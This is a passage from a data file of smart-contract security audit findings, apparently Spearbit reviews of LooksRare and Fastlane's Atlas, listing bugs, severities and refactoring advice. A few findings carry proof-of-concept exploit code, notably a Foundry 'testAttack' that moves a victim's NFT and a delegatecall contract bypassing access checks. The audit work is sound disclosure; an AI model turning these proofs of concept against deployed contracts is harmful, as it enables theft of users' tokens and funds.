itemSelectorStrategy = new ItemSelectorStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, ItemSelectorStrategy.execute.selector, false, address(itemSelectorStrategy) ); } 64 vm.stopPrank(); _setUpUser(victimUser); } function testAttack() public { vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(looksRareProtocol), looksRareProtocol.restrictedExecuteTakerBid.selector ); payloadStrategy.set( address(mockERC721), address(mockERC20), 0, victimUser, 2 // itemSelectorStrategy ID ); itemSelectorStrategy.set(1, 1); OrderStructs.MakerBid memory makerBid = _createSingleItemMakerBidOrder({ // payloadStrategy bidNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // LooksRareProtocol itself orderNonce: 0, collection: address(0x80), // calldata offset currency: address(mockERC20), signer: signingOwner, maxPrice: 0, itemId: 1 }); bytes memory signature = _signMakerBid(makerBid, signingOwnerPK); OrderStructs.TakerAsk memory takerAsk; vm.stopPrank(); vm.prank(specialUser1); looksRareProtocol.executeTakerAsk( takerAsk, makerBid, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); assertEq(mockERC721.balanceOf(victimUser), 0); assertEq(mockERC721.ownerOf(1), specialUser2); } }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "viewCreatorFeeInfo can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "viewCreatorFeeInfo includes a low-level staticcall to collection's royaltyInfo endpoint and later its return status is compared and the return data is decoded.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_verifyMerkleProofOrOrderHash can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMerkleProofOrOrderHash includes a if/else block that calls into _computeDigestAndVer- ify with almost the same inputs (only the hash is different).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "isOperatorValidForTransfer can be modified to refactor more of the logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "isOperatorValidForTransfer is only used to revert if necessary. The logic around the revert decision on all call sites.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep maximum allowed number of characters per line to 120.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "avoid transferring in _transferFungibleTokens when sender and recipient are equal", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Currently, there is no check in _transferFungibleTokens to avoid transferring funds from sender to recipient when they are equal. There is only one check outside of _transferFungibleTokens when one wants to transfer to an affiliate. But if the bidUser is the creator, or the ask recipient or the protocolFeeRecipient, the check is missing.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep the order of parameters consistent in updateStrategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In updateStrategy, isActive is set first when updating storage, and it's the second parameter when supplied to the StrategyUpdated event. But it is the last parameter supplied to updateStrategy.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_transferFungibleTokens does not check whether the amount is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_transferFungibleTokens does not check whether amount is 0 to skip transferring to recipient. For the ask recipient and creator amounts the check is performed just before calling this function. But the check is missing for the affiliate and protocol fees.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyItemIdsRange.executeStrategyWithTakerAsk - Maker's bid amount might be entirely ful- filled by a single ERC1155 item", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange allows a buyer to specify a range of potential item ids (both ERC721 and ERC1155) and a desired amount, then a seller can match the buyer's request by picking a subset of items from the provided range so that the desired amount of items are eventually fulfilled. a taker might pick a single ERC1155 item id from the range and fulfill the entire order with multiple instances of that same item.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Define named constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " ExecutionManager.sol#L289 : 0x7476320f is cast sig \"OutsideOfTimeRange()\"  TransferSelectorNFT.sol#L30 : 0xa7bc96d3 is cast sig \"transferItemsERC721(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC721.selector  TransferSelectorNFT.sol#L31 : 0xa0a406c6 is cast sig \"transferItemsERC1155(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC1155.selector.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and executeCollectionStrategyWithTakerAskWithProof can be relaxed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the above context, a maker is bidding a maximum price pmax and a taker is asking a minimum price pmin, the strategy should calculate a price p in the range [pmin, pmax ] and so we would need to have pmin (cid:20) pmax . The above strategies pick the execution price to be pmax (the maximum price bid by the maker), and since the taker is the caller to the protocol we would only need to require pmin (cid:20) pmax . But the current requirement is pmin = pmax . if ( ... || makerBid.maxPrice != takerAsk.minPrice) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Change occurances of whitelist to allowlist and blacklist to blocklist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the codebase, whitelist (blacklist) is used to represent entities or objects that are allowed (denied) to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Add more documentation on expected priceFeed decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Chainlink strategies are making the following assumptions 1. All priceFeeds in StrategyFloorFromChainlink have a decimals value of 18. 2. The priceFeed in StrategyUSDDynamicAsk has a decimals value of 8. Any priceFeed that is added that does not match these assumptions would lead to incorrect calculations.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Code duplicates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "* In some places, Chainlink staleness is checked using block.timestamp - updatedAt > maxLa- tency, and in other places it is checked using block.timestamp > maxLatency + updatedAt. Consider refactor- ing this code into a helper function. Otherwise, it would be better to use only one version of the two code snippets across the protocol.  The validation check to match assetType with the actual amount of items being transferred is duplicated among the different strategies instead of being implemented at a higher level once, such as in a common function or class that can be reused among the different strategies.  _executeStrategyForTakerAsk and _executeStrategyForTakerBid almost share the same code.  TakerBid, TakerAsk can be merged into a single struct.  MakerBid, MakerAsk can be merged into a single struct.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Low level calls are not recommended as they lack type safety and won't revert for calls to EOAs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Low-level calls are not recommended for interaction between different smart contracts in modern versions of the compiler, mainly because they lack type safety, return data size checks, and won't revert for calls to Externally Owned Accounts.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Insufficient input validation of orders (especially on the Taker's side)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is a lack of consistency in the validation of parameters, as some fields of the taker's order are checked against the maker's order while others are not. It is worth noting that we have not identified any significant impact caused by this issue.  Missing validation of strategyId  Missing validation of collection  Most strategies only validate length mismatches on one side of the order. Also, they don't usually validate that the lengths match between both sides. For example, in the DutchAuction strategy, if the makerAsk has itemIds and amounts arrays of length 2 and 2, then it would be perfectly valid for the takerBid to use itemIds and amounts arrays of length 5 and 7, as long as the first two elements of both arrays match what is expected. (FYI: I filed a related issue for the ItemIdsRange strategy, which I think is more severe of an issue because the mismatched lengths can actually be returned from the function).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "LooksRareProtocol's owner can take maker's tokens for signed orders with unimplemented strat- egyIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If a maker signs an order that uses a strategyId that hasn't been added to the protocol yet, the protocol owner can add a malicious strategy afterward such that a taker would be able to provide no fulfillment but take all the offers.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Strategies with faulty price feeds can have unwanted consequences", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In LooksRare protocol once a strategy has been added its implementation and selector cannot be updated. This is a good since users who sign their MakerBid or MakerAsk can trustlessly examine the strategy implementation before including them into their orders. Some strategies might depend on other actors such as price feeds. This is the case for StrategyUSDDynamicAsk and StrategyFloorFromChainlink. If for some reason these price feeds do not return the correct prices, these strategies can have a slight deviation from their original intent. Case StrategyUSDDynamicAsk If the price feed returns a lower price, a taker can bid on an order with that lower price. This scenario is guarded by MakerAsk's minimum price. But the maker would not receive the expected amount if the correct price was reported and was greater than the maker's minimum ask. Case StrategyFloorFromChainlink For executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCollec- tionOfferStrategyWithTakerAsk if the price feeds reports a floor price higher than the maker's maximum bid price, the taker can match with the maximum bid. Thus the maker ends up paying more than the actual floor adjusted by the discount formula. For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid if the price feeds report a floor price lower than the maker's minimum ask price, the taker can match with the minimum ask price and pay less than the actual floor price (adjusted by the premium).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The provided price to IERC2981.royaltyInfo does not match the specifications", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "royaltyFeeRegistry.royaltyInfo does not return a non-zero creator address, we check whether the collection supports IERC2981 and if it does, we loop over each itemId and call the collection's royaltyInfo endpoint. But the input price parameters provided to this endpoint do not match the specification of EIP-2981: CreatorFeeManagerWithRoyalties, CreatorFeeManagerWithRebates and /// @param _salePrice - the sale price of the NFT asset specified by _tokenId 78 The price provided in viewCreatorFeeInfo functions, is the price for the whole batch of itemIds and not the individual tokens itemIds[i] provided to the royaltyInfo endpoint. Even if the return values (newCreator, newCreatorFee) would all match, it would not mean that newCreatorFee should be used as the royalty for the whole batch. An example is that if the royalty is not percentage-based, but a fixed price.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Replace the abi.encodeWithSelector with abi.encodeCall to ensure type and typo safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, abi.encodeWithSelector is used to create the call data for a call to an external contract. This function does not guarantee that mismatched types are used for the input parameters.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Use the inline keccak256 with the formatting suggested when defining a named constant for an EIP-712 type hash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Hardcoded byte32 EIP-712 type hashes are defined in the OrderStructs library.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Calculations in solverMetaTryCatch() non consistent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The calculations in solverMetaTryCatch() non consistent. The drawings below show the different situations.  startBalance and endBalance calculations The tables below show remarks concerning the startBalance and endBalance calculations. | ETH start- invertsBidValue | invertsBidValue| | ------------ | ----------------------| ------- | | Balance and endBalance | ! bidFind==true | endBalance includes solverOp.value and initial balance so compare to bidAmount isn't ok | startBalance == 0 so this fails: netBid = startBalance - endBalance | | bidFind==false | endBal- ance includes solverOp.value and initial balance so compare to bidAmount isn't ok| startBalance == 0 so this fails: startBalance - endBalance | ERC20startBalance and end- Balance ! invertsBidValue invertsBidValue bidFind==true bidFind==false Seems ok Seems ok Assumes sufficient ERC20 in EE Assumes sufficient ERC20 in EE No allowance to solver 7 When invertsBidValue == false, the endBalance is used, which includes the solverOp.value and the initial ETH balance. This is compared to bidAmount but that doesn't seem right. The startBalance for ETH is set to 0 which leads to reverts when invertsBidValue == true, because the code tries to subtract from 0.  (ExtraEth)EndBalance calculations Variable endBalance is reused for a second purpose. (ExtraEth)EndBalance is used. To make this clear, in the following text The tables below show remarks concerning the (ExtraEth)EndBalance that is contributed to Atlas. ETH (ExtraEth)EndBalance ! invertsBidValue invertsBidValue bidFind==true bidFind==false (ExtraEth)EndBalance is always 0 (ExtraEth)EndBalance is always 0 (ExtraEth)EndBalance = endBal- ance - bidAmount, (ExtraEth)EndBalance = endBal- ance, however includes endBalance solverOp.value and initial bal- ance however includes endBalance solverOp.value and initial bal- ance should be something like: Balance - startBalance ) - bidAmount (end- be should (startBalance - endBalance) - bidAmount something like: ERC20 (ExtraEth)EndBalance ! invertsBidValue invertsBidValue bidFind==true When extra ERC20 dress(this).balance, else 0 tokens ad- When extra ERC20 dress(this).balance, else 0 tokens ad- bidFind==false address(this).balance address(this).balance For ETH and bidFind==true, the (ExtraEth)EndBalance is always 0, so the code could be simplified. For ETH and bidFind==false the (ExtraEth)EndBalancecalculations don't take into account that endBal- ance includes the solverOp.value and the initial ETH balance. When invertsBidValue == true the startBalance for ETH is set to 0 which leads to reverts when inverts- BidValue == true, because the code tries to subtract from 0. With ERC20 and invertsBidValue case:  The PreOps hook is supposed supply initial ERC20 tokens to the ExecutionEnvironment, there is no comment about this.  The solver is supposed (as few as possible) ERC20 tokens from the ExecutionEnvironment, however no allowance is set for the solver. For ERC20 the (ExtraEth)EndBalance is sometimes address(this).balance and sometimes 0, doesn't seem right. this", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "validControl / onlyAtlasEnvironment are not effective in delegatecall situation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The checks validControl / onlyAtlasEnvironment are not effective in delegatecall situation: If the ExecutionEnvironment does a delegatecall to a user contract, or inside any DappControl hook, any data can be provided at the end of the call parameters. Because it also has msg.sender == atlas a large number of calls are possible. See for a proof of concept below. Possible consequences:  The user contract can also into all the hooks of the DappControl contract.  The user contract can also into all other DappControl contracts.  This could also be done via a man in the middle attack: all delegate calls to an attacker DappControl are delegate called to the original DappControl contract. The original DappControl contract isn't aware of this.  The user contract can also reenter into the ExecutionEnvironment, it can:  Adjust all configurations.  Execute all functions.  Call one (or more) solver contracts.  The user contract can also call into other ExecutionEnvironments, but because it is a delegatecall and they all have same code that seems no problem.  All DappControl hooks can call into the following (but the risk is limited because they already have access to the funds of the ExecutionEnvironment):  withdrawERC20()  factoryWithdrawERC20()  withdrawEther()  factoryWithdrawEther() Here is a proof of concept: 9 contract UserContract { function callPreOpsCall(address control) public { console.log(\"in UserContract callPreOpsCall\"); UserOperation memory userOp; bytes memory data = abi.encodeWithSelector(DAppControl.preOpsCall.selector, userOp); bytes memory preOpsData = bytes.concat(data, abi.encodePacked(address(0),bool(false),bool(false),uint8(0),uint8(0), uint16(type(uint16).max), // all states uint24(0),bool(false),bool(false),uint8(2)), abi.encodePacked(address(0), address(control), uint32(0), bytes32(0)) ); (bool success, ) = address(control).delegatecall(preOpsData); console.logBool(success); } } modifier validControl() { if (CONTROL != _control()) revert AtlasErrors.InvalidControl(); _; } modifier onlyAtlasEnvironment(ExecutionPhase phase, uint8 acceptableDepths) { _onlyAtlasEnvironment(phase, acceptableDepths); _; } function _onlyAtlasEnvironment(ExecutionPhase phase, uint8 acceptableDepths) internal view { if (address(this) == source) { revert AtlasErrors.MustBeDelegatecalled(); } if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } if (uint16(1 << (EXECUTION_PHASE_OFFSET + uint16(phase))) & _lockState() == 0) { revert AtlasErrors.WrongPhase(); } if (1 << _depth() & acceptableDepths == 0) { revert AtlasErrors.WrongDepth(); } }", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "reconcile() creates deposits out of thin air", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "A call to reconcile() with non-zero maxApprovedGasSpend increases surplus and deposit. Assum- ing maxApprovedGasSpend fits within the bonded balance of the current solver, this will later on be _credited to the solver. However there is no registration or backing of this maxApprovedGasSpend, so this creates a bonded balance out of thin air. The comments say This will be subtracted later, but we couldn't find where this is done. The severity of this issue is increased by the following related issues:  \"reconcile() can be called by anyone\".  \"Checks for solverCalledBack don't cover all situations\". function reconcile(address environment,address solverFrom,uint256 maxApprovedGasSpend) /*...*/ {  s atlETH that the solver is allowing This will be subtracted later - tx will revert here if there  // NOTE: approvedAmount is the amount of the solver // to be used to cover what they owe. isn t // enough. // ... uint256 bondedBalance = uint256(accessData[solverFrom].bonded); if (maxApprovedGasSpend > bondedBalance) maxApprovedGasSpend = bondedBalance; // ... uint256 surplus = deposits + maxApprovedGasSpend + msg.value; // Add msg.value to solver s deposits if (msg.value > 0 || maxApprovedGasSpend > 0) deposits = surplus; // ...  ,! } // deposits is increased now", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Flag _solverFulfilled is unreliable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function reconcile() sets the flag _solverFulfilled if sufficient funds are present. Later on validateBalances() trusts this flag and doesn't do any additional checks. However after a call reconcile() it is still possible to do _borrow() and _contribute(), which change with- drawals and deposits. This could be done in the same hook that calls reconcile(). 11 function reconcile(/*...*/ ) /*...*/ { // ... uint256 deficit = claims + withdrawals; uint256 surplus = deposits + maxApprovedGasSpend + msg.value; // ... if (deficit > surplus) { // ... return deficit - surplus; } // CASE: Callback verified and solver duty fulfilled if (!calledBack || !fulfilled) { _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack | _solverFulfilled; } return 0; } function validateBalances() external view returns (bool calledBack, bool fulfilled) { (, calledBack, fulfilled) = solverLockData(); if (!fulfilled) { uint256 _deposits = deposits; // Check if locked. if (_deposits != type(uint256).max) { fulfilled = deposits >= claims + withdrawals; } } } function solverLockData() public view returns (address currentSolver, bool calledBack, bool fulfilled) { uint256 solverLock = _solverLock; // ... fulfilled = solverLock & _solverFulfilled != 0; }", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Nonce logic is skipped for smart contract wallets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If the userOp.from address is a smart contract, the _verifyUser() function makes a call to the user's validateUserOp() function. This call is expected to return a success bool value, which is instantly returned. Since this return happens before the code reaches _handleNonces(), there is no nonce validation for smart con- tract wallets. Most smart contract validation functions (e.g. validateUserOp() in the case of ERC4337 or is- ValidSignature() in the case of ERC1271) do not manage nonces themselves, and rely on the caller for this. As a result, signatures can be replayed and nonces can be reused when the user is a smart contract wallet. Also see the issue titled \"Call to validateUserOp() won't work\", which suggests replacing validateUserOp() with isValidSignature().", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "_releaseSolverLock() doesn't undo all the actions of _trySolverLock()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _releaseSolverLock() doesn't undo all the actions of _trySolverLock(). Function _releaseSolverLock() keeps _solverLock set to the (latest) solver, which means that in the Allocat- eValue hook and PostOps hook this value is still set. This allows reconcile() to still be called, even after it has been made authorized. See issue \"reconcile() can be called by anyone\". Function _releaseSolverLock() doesn't undo the addition to withdrawals. This is good for the winning solver, because the ETH has been send to solverMetaTryCatch(). However if solverMetaTryCatch() reverts this is not good. The value of withdrawals will increase with every unsuccessfulsolver until eventually it is higher than the address(this).balance. After that the next solvers will fail because _borrow() will return false. Also see issue \"Check with withdrawals in _borrow() not correct \". Furthermore _releaseSolverLock() isn't always called, see issues:  \"Solvers don't always reimburse the bundler\".  \"Winning solver doesn't get gas costs _assign()ed\". Sometimes _releaseSolverLock() is called without _trySolverLock():  \"_releaseSolverLock() can be run without _trySolverLock()\". Additionally function _releaseSolverLock() assigns used gas, which isn't shown in the function name. 13 function _trySolverLock(SolverOperation calldata solverOp) internal returns (bool valid) { if (_borrow(solverOp.value)) { _solverLock = uint256(uint160(solverOp.from)); return true; } else { return false; } } function _releaseSolverLock(/*...*/ ) /*...*/ { // doesn // doesn t set _solverLock t change withdrawals   } function _borrow(uint256 amount) internal returns (bool valid) { // ... if (address(this).balance < amount + claims + withdrawals) return false; withdrawals += amount; return true; }", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "solverMetaTryCatch() assumes there is no pre-existing ETH in contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "solverOp.value: solverMetaTryCatch() requires ExecutionEnvironment's balance to be the same as require(address(this).balance == solverOp.value, \"ERR-CE05 IncorrectValue\"); However, someone can frontrun this transaction and send some ETH to ExecutionEnvironment making its balance non-zero. This leads to the solverMetaTryCatch() call reverting, since the call is sent with an ETH amount equal to solverOp.value. This makes address(this).balance > solverOp.value. Since the error would be treated as SolverOutcome.EVMError in the _solverOpWrapper(), the solver would be forced to pay the gas costs for this revert.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Bid tokens aren't enforced to be the same", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In Atlas, bid tokens are specified in multiple locations: 1. Within the DAppConfig (specifically from the getBidFormat() function). 2. Within each SolverOperation. Currently, it's not enforced on-chain that these values are all consistent with each other. If the auctioneer or bundler includes different tokens in a transaction, the bid amount comparisons and the allocateValueCall() function would silently break, which could lead to unexpected results.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "No slippage protection for UniswapV2 swaps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "amount0In and amount1In values are dependent on UniswapV2 pool's current token balance and on amount-out values. Someone can sandwich Atlas transaction to imbalance the pool leading to high amount-in value which is then transferred from user to the pool. The attacker makes a profit through this sandwich and thus it's likely that all the token balance of the user is transferred to the pool.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "bypassSignatoryApproval skips important checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the initial AtlasVerification call, the _verifyDApp() function does various checks on the dAppOp argument. For example, see the following code snippet (with some comments removed for simplicity): function _verifyDApp( DAppConfig memory dConfig, DAppOperation calldata dAppOp, address msgSender, bool bypassSignatoryApproval, bool isSimulation ) { internal returns (bool, ValidCallsResult) bool bypassSignature = msgSender == dAppOp.from || (isSimulation && dAppOp.signature.length == 0); if (!bypassSignature && !_verifyDAppSignature(dAppOp)) { return (false, ValidCallsResult.DAppSignatureInvalid); } if (bypassSignatoryApproval) return (true, ValidCallsResult.Valid); // If bypass, return true after signature ,! // verification if (dAppOp.bundler != address(0) && msgSender != dAppOp.bundler) { if (!signatories[keccak256(abi.encodePacked(dAppOp.control, msgSender))]) { bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); if (!isSimulation) { return (false, ValidCallsResult.InvalidBundler); } } } if (!signatories[keccak256(abi.encodePacked(dAppOp.control, dAppOp.from))]) { bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); } } if (dAppOp.control != dConfig.to) { return (false, ValidCallsResult.InvalidControl); } if (dAppOp.from == address(0) && isSimulation) { return (true, ValidCallsResult.Valid); } if (!_handleNonces(dAppOp.from, dAppOp.nonce, !dConfig.callConfig.needsSequencedDAppNonces(), isSimulation)) { ,! return (false, ValidCallsResult.InvalidDAppNonce); } return (true, ValidCallsResult.Valid); } 16 There are six main checks in this function: 1. A check that dAppOp.from has authorized the transaction (either as msgSender or through a signature). 2. A check that the msgSender is authorized to act as a bundler. 3. A check that the dAppOp.from is authorized to act as the auctioneer. 4. A check that ensures dAppOp.control == dConfig.to . 5. A simulation check for dAppOp.from == address(0). 6. A nonce check (with associated logic that will invalidate the used nonce). This function also includes a bypassSignatoryApproval boolean, which will skip checks 2-6 if true. However, some of these checks should not be skipped, for example, the dAppOp.control check (number 4) and the nonce logic (number 6) seem important to execute regardless of the value of bypassSignatoryApproval. With the nonce check specifically, this behavior would sometimes allow dAppOp nonces to be reused or executed in an unexpected order.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Incorrect indexing for bid sorting algorithm", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "When an Atlas CallConfig specifies exPostBids == true, all solverOps are simulated on-chain to determine their theoretical bid amount. The solverOps are then sorted and executed in order until a solverOp succeeds. The sorting of the bids is facilitated through the following code: 17 uint256[] memory sortedOps = new uint256[](solverOps.length); uint256[] memory bidAmounts = new uint256[](solverOps.length); uint256 j; uint256 bidPlaceholder; for (uint256 i; i < solverOps.length; i++) { bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); if (bidPlaceholder == 0) { unchecked { ++j; } continue; } else { bidAmounts[i] = bidPlaceholder; for (uint256 k = i - j + 1; k > 0; k--) { if (bidPlaceholder > bidAmounts[sortedOps[k - 1]]) { sortedOps[k] = sortedOps[k - 1]; sortedOps[k - 1] = i; } else { sortedOps[k] = i; break; } } } } Notice that the inner for loop starts with the index k = i - j + 1. Since it's possible that j always remains at 0 (i.e. if all bid simulations succeed), this index may be out-of-bounds for the sortedOps array, which will cause an unintended revert. This indexing can also potentially leave the 